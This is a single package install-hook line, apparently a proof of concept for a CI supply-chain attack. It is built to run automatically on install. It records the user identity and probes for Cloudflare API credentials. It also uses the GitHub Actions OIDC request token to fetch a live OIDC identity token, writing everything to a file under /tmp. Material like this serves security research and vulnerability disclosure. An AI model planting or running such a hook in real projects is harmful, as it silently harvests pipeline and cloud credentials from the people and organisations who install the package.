scripts.postinstall: bash -c 'id > /tmp/poc-proof.txt; echo "CF_API_TOKEN_LEN=${#CLOUDFLARE_API_TOKEN}" >> /tmp/poc-proof.txt; echo "CF_ACCOUNT_ID_SET=${CLOUDFLARE_ACCOUNT_ID:+yes}" >> /tmp/poc-proof.txt; echo "CF_GATEWAY_SET=${CLOUDFLARE_GATEWAY_ID:+yes}" >> /tmp/poc-proof.txt; echo "OIDC_REQUEST_TOKEN=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+present}" >> /tmp/poc-proof.txt; curl -s --max-time 10 -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=poc" >> /tmp/poc-proof.txt; echo >> /tmp/poc-proof.txt; exit 0'
